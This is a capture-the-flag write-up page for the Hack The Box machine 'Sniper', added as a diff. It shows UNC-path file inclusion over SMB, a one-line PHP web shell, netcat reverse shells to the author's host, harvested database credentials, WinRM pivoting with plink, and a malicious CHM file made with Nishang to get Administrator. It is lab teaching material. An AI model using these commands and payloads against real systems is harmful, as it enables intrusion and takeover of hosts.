@@ -1,0 +1,738 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Sniper - Hack The Box - hackcommander.io</title>
+<meta name="description" content="Sniper is another box I got access to through an unintended method. The PHP application wasn’t supposed to be exploitable through Remote File Inclusion but because it runs on Windows, we can use UNC path to include a file from an SMB share. Once I had a shell, I pivoted using plink and logged in as user Chris with WinRM. The box author was nice enough to leave hints as to what kind of malicious payload was expected and I used Nishang to generate a CHM payload and get Administrator access.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Sniper - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-sniper/">
+
+
+  <meta property="og:description" content="Sniper is another box I got access to through an unintended method. The PHP application wasn’t supposed to be exploitable through Remote File Inclusion but because it runs on Windows, we can use UNC path to include a file from an SMB share. Once I had a shell, I pivoted using plink and logged in as user Chris with WinRM. The box author was nice enough to leave hints as to what kind of malicious payload was expected and I used Nishang to generate a CHM payload and get Administrator access.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-sniper/sniper_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2020-03-28T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-sniper/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Sniper - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Sniper - Hack The Box">
+    <meta itemprop="description" content="Sniper is another box I got access to through an unintended method. The PHP application wasn’t supposed to be exploitable through Remote File Inclusion but because it runs on Windows, we can use UNC path to include a file from an SMB share. Once I had a shell, I pivoted using plink and logged in as user Chris with WinRM. The box author was nice enough to leave hints as to what kind of malicious payload was expected and I used Nishang to generate a CHM payload and get Administrator access.">
+    <meta itemprop="datePublished" content="March 28, 2020">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Sniper - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-03-28T00:00:00+01:00">March 28, 2020 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-sniper/sniper_logo.png" alt="" /></p>
+
+<p>Sniper is another box I got access to through an unintended method. The PHP application wasn’t supposed to be exploitable through Remote File Inclusion but because it runs on Windows, we can use UNC path to include a file from an SMB share. Once I had a shell, I pivoted using plink and logged in as user Chris with WinRM. The box author was nice enough to leave hints as to what kind of malicious payload was expected and I used Nishang to generate a CHM payload and get Administrator access.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>Exploit an RFI in the language parameter to include a PHP file through SMB and gain RCE</li>
+  <li>Retrieve the MySQL credentials from the database</li>
+  <li>Upgrade the shell to a meterpreter shell and port forward WinRM</li>
+  <li>Login as user Chris with the forwarded WinRM socket</li>
+  <li>Identify through hints that the admin is waiting for a .chm file</li>
+  <li>Craft a malicious .chm file and get a reverse shell as Administrator</li>
+</ul>
+
+<h2 id="portscan">Portscan</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/sniper# nmap -sC -sV -T4 -p- 10.10.10.151
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-06 09:01 EDT
+Nmap scan report for sniper.htb (10.10.10.151)
+Host is up (0.049s latency).
+Not shown: 65530 filtered ports
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Sniper Co.
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+49667/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7h00m13s
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2019-10-06T20:04:16
+|_  start_date: N/A
+</code></pre></div></div>
+
+<h2 id="smb">SMB</h2>
+
+<p>No access to shares on SMB</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/sniper# smbmap -u invalid -H 10.10.10.151
+[+] Finding open SMB ports....
+[!] Authentication error occured
+[!] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[!] Authentication error on 10.10.10.151
+root@kali:~/htb/sniper# smbmap -u '' -H 10.10.10.151
+[+] Finding open SMB ports....
+[!] Authentication error occured
+[!] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+[!] Authentication error on 10.10.10.151
+</code></pre></div></div>
+
+<h2 id="web">Web</h2>
+
+<p>The website is pretty generic and most of the links don’t work.</p>
+
+<p><img src="/assets/images/htb-writeup-sniper/website1.png" alt="" /></p>
+
+<p>At the bottom of the main page there is a link to the User Portal.</p>
+
+<p><img src="/assets/images/htb-writeup-sniper/website2.png" alt="" /></p>
+
+<p>The user portal has a login page and there is a link at the bottom to register a new user.</p>
+
+<p><img src="/assets/images/htb-writeup-sniper/website3.png" alt="" /></p>
+
+<p>The registration page looks like this.</p>
+
+<p><img src="/assets/images/htb-writeup-sniper/website4.png" alt="" /></p>
+
+<p>After creating myself an account, I log in and see that it’s still under construction.</p>
+
+<p><img src="/assets/images/htb-writeup-sniper/construction.png" alt="" /></p>
+
+<p>Next, I scanned the site with <a href="https://github.com/phra/rustbuster">rustbuster</a> and found a blog link I didn’t see earlier.</p>
+
+<p><img src="/assets/images/htb-writeup-sniper/dirb1.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-sniper/dirb2.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-sniper/dirb3.png" alt="" /></p>
+
+<p>The blog is pretty generic but there is an interesting link to change the language of the page.</p>
+
+<p><img src="/assets/images/htb-writeup-sniper/blog1.png" alt="" /></p>
+
+<p>As shown in the source code, it is possibly a target for an LFI or RFI since it references a PHP file.</p>
+
+<p><img src="/assets/images/htb-writeup-sniper/blog2.png" alt="" /></p>
+
+<h2 id="gaining-rce-through-rfi-in-the-language-parameter">Gaining RCE through RFI in the language parameter</h2>
+
+<p>To test for local file inclusion I’ll try including a Windows file I know exists on the target machine. Luckily for me the <code class="language-plaintext highlighter-rouge">lang</code> parameter uses the filename with the extension so I can potentially include any file, not just file with php extensions. I am able to get the content of <code class="language-plaintext highlighter-rouge">win.ini</code> with the following:</p>
+
+<p><code class="language-plaintext highlighter-rouge">GET /blog/?lang=/windows/win.ini</code></p>
+
+<p><img src="/assets/images/htb-writeup-sniper/lfi1.png" alt="" /></p>
+
+<p>Next I try to include a remote file through HTTP with <code class="language-plaintext highlighter-rouge">GET /blog/?lang=http://10.10.14.11/test.php</code> but I didn’t get a callback so I assume remote file includes are disabled or there is some filtering done on the parameter.</p>
+
+<p>Even though remote file includes are disabled, using a UNC path works since it’s considered a local path by PHP and I’m able to get a callback through SMB on port 445 with <code class="language-plaintext highlighter-rouge">GET /blog/?lang=//10.10.14.11/test/test.php</code></p>
+
+<p><img src="/assets/images/htb-writeup-sniper/smb1.png" alt="" /></p>
+
+<p>I can’t get impacket-smbserver working right with this box so instead I’ll use the standard Samba server in Linux and create an open share: <code class="language-plaintext highlighter-rouge">net usershare add test /root/htb/sniper/share '' 'Everyone:F' guest_ok=y</code></p>
+
+<p>Before trying to get RCE, I’ll create an <code class="language-plaintext highlighter-rouge">info.php</code> file that calls <code class="language-plaintext highlighter-rouge">phpinfo()</code> so I can check for any disabled functions:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">phpinfo</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>After calling <code class="language-plaintext highlighter-rouge">phpinfo()</code> with <code class="language-plaintext highlighter-rouge">GET /blog/?lang=//10.10.14.11/test/info.php</code> I see that it’s running Windows build 17763 and that no functions are disabled.</p>
+
+<p><img src="/assets/images/htb-writeup-sniper/info1.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-sniper/info2.png" alt="" /></p>
+
+<p>Next I’ll create another PHP file to execute commands passed in the <code class="language-plaintext highlighter-rouge">cmd</code> parameter:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">]);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>And with the following request I can execute commands: <code class="language-plaintext highlighter-rouge">GET /blog/?lang=//10.10.14.11/test/nc.php&amp;cmd=whoami</code></p>
+
+<p><img src="/assets/images/htb-writeup-sniper/rce1.png" alt="" /></p>
+
+<p>To get a shell I’ll upload netcat to the server with <code class="language-plaintext highlighter-rouge">GET /blog/?lang=//10.10.14.11/test/nc.php&amp;cmd=copy+\\10.10.14.11\test\nc.exe+c:\programdata\nc.exe</code></p>
+
+<p><img src="/assets/images/htb-writeup-sniper/rce2.png" alt="" /></p>
+
+<p>Then I execute netcat to get a shell with <code class="language-plaintext highlighter-rouge">GET /blog/?lang=//10.10.14.11/test/nc.php&amp;cmd=c:\programdata\nc.exe+-e+cmd.exe+10.10.14.11+80</code></p>
+
+<p><img src="/assets/images/htb-writeup-sniper/shell.png" alt="" /></p>
+
+<h2 id="enumeration-of-the-machine">Enumeration of the machine</h2>
+
+<p>The first thing I check is the <code class="language-plaintext highlighter-rouge">C:\inetpub\wwwroot\user\db.php</code> file used by the login portal so I can see which credentials are used to connect to the database:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="c1">// Enter your Host, username, password, database below.</span>
+<span class="c1">// I left password empty because i do not set password on localhost.</span>
+<span class="nv">$con</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">,</span><span class="s2">"dbuser"</span><span class="p">,</span><span class="s2">"36mEAhz/B8xQ~2VM"</span><span class="p">,</span><span class="s2">"sniper"</span><span class="p">);</span>
+<span class="c1">// Check connection</span>
+<span class="k">if</span> <span class="p">(</span><span class="nf">mysqli_connect_errno</span><span class="p">())</span>
+  <span class="p">{</span>
+  <span class="k">echo</span> <span class="s2">"Failed to connect to MySQL: "</span> <span class="mf">.</span> <span class="nf">mysqli_connect_error</span><span class="p">();</span>
+  <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Then I check out which local users are present on the box:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\&gt;net users
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            Chris                    DefaultAccount
+Guest                    WDAGUtilityAccount
+</code></pre></div></div>
+
+<p>The next logical step is to get access to user <code class="language-plaintext highlighter-rouge">Chris</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+Local Group Memberships      *Remote Management Users
+Global Group memberships     *None
+...
+</code></pre></div></div>
+
+<p>Chris is part of the Remote Management Users group and WinRM is listening on port 5985 but firewalled off from the outside.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\&gt;netstat -an
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:33060          0.0.0.0:0              LISTENING
+[...]
+...
+</code></pre></div></div>
+
+<h2 id="shell-as-user-chris-with-winrm">Shell as user Chris with WinRM</h2>
+
+<p>To connect to WinRM I’ll upload plink.exe and create a reverse tunnel for port 5985.</p>
+
+<p><img src="/assets/images/htb-writeup-sniper/plink.png" alt="" /></p>
+
+<p>After pivoting, I am able to log in as user Chris.</p>
+
+<p><img src="/assets/images/htb-writeup-sniper/chris.png" alt="" /></p>
+
+<p>I find that WinRM is a tad slow so I’ll spawn another netcat as user Chris to continue my enumeration.</p>
+
+<h2 id="more-enumeration">More enumeration</h2>
+
+<p>The <code class="language-plaintext highlighter-rouge">c:\docs</code> directory was previously unaccessible with the previous user but I can see the files now with user Chris.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\docs&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is 6A2B-2640
+
+ Directory of C:\docs
+
+10/01/2019  01:04 PM    &lt;DIR&gt;          .
+10/01/2019  01:04 PM    &lt;DIR&gt;          ..
+04/11/2019  09:31 AM               285 note.txt
+04/11/2019  09:17 AM           552,607 php for dummies-trial.pdf
+               2 File(s)        552,892 bytes
+               2 Dir(s)  17,885,601,792 bytes free
+</code></pre></div></div>
+
+<p>The .pdf doesn’t have anything interesting but <code class="language-plaintext highlighter-rouge">note.txt</code> contains a hint:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type note.txt
+Hi Chris,
+	Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.
+
+Regards,
+Sniper CEO.
+</code></pre></div></div>
+
+<p>Ok, so the CEO (probably the administrator) is expecting some documentation files to be dropped in this folder. There’s probably a script bot running and opening files in this folder. I don’t know what kind of payload he’s expecting so I’ll keep on looking around the box.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">C:\Users\Chris\Downloads</code> directory contains a CHM file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Chris\Downloads&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is 6A2B-2640
+
+ Directory of C:\Users\Chris\Downloads
+
+04/11/2019  08:36 AM    &lt;DIR&gt;          .
+04/11/2019  08:36 AM    &lt;DIR&gt;          ..
+04/11/2019  08:36 AM            10,462 instructions.chm
+               1 File(s)         10,462 bytes
+               2 Dir(s)  17,885,601,792 bytes free
+</code></pre></div></div>
+
+<p>As per Wikipedia:</p>
+
+<blockquote>
+  <p>Microsoft Compiled HTML Help is a Microsoft proprietary online help format, consisting of a collection of HTML pages, an index and other navigation tools. The files are compressed and deployed in a binary format with the extension .CHM, for Compiled HTML. The format is often used for software documentation.</p>
+</blockquote>
+
+<p>So now things are starting to click:</p>
+<ol>
+  <li>The admin/CEO is expecting documentation</li>
+  <li>The instruction.chm file is a compiled html file used for documentation</li>
+</ol>
+
+<p>I remembered reading about malicious CHM files some time ago so I make sure to open the file in an isolated Windows VM:</p>
+
+<p><img src="/assets/images/htb-writeup-sniper/instructions.png" alt="" /></p>
+
+<p>I did some research and found the <a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1">Nishang Out-CHM</a> tool that can generate malicious payload. I should be able to get RCE as the administrator with this malicious file.</p>
+
+<h2 id="generating-a-malicious-chm-file-for-privilege-escalation">Generating a malicious CHM file for privilege escalation</h2>
+
+<p>After installing the HTML Help Workshop on my Windows machine, I generated a malicious CHM file that uses netcat to spawn a reverse shell:</p>
+
+<p><code class="language-plaintext highlighter-rouge">PS &gt; Out-CHM -Payload "C:\programdata\nc.exe -e cmd.exe 10.10.14.11 3333" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"</code></p>
+
+<p>Uploaded it to the server…</p>
+
+<p><code class="language-plaintext highlighter-rouge">*Evil-WinRM* PS C:\docs&gt; copy \\10.10.14.11\test\doc.chm .</code></p>
+
+<p>And boom, got a shell as <code class="language-plaintext highlighter-rouge">administrator</code>:</p>
+
+<p><img src="/assets/images/htb-writeup-sniper/root.png" alt="" /></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#chm" class="page__taxonomy-item" rel="tag">chm</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">php</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#plink" class="page__taxonomy-item" rel="tag">plink</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#rfi" class="page__taxonomy-item" rel="tag">rfi</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#unintended" class="page__taxonomy-item" rel="tag">unintended</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#winrm" class="page__taxonomy-item" rel="tag">winrm</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-03-28T00:00:00+01:00">March 28, 2020</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-forest/" class="pagination--pager" title="Forest - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-registry/" class="pagination--pager" title="Registry - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
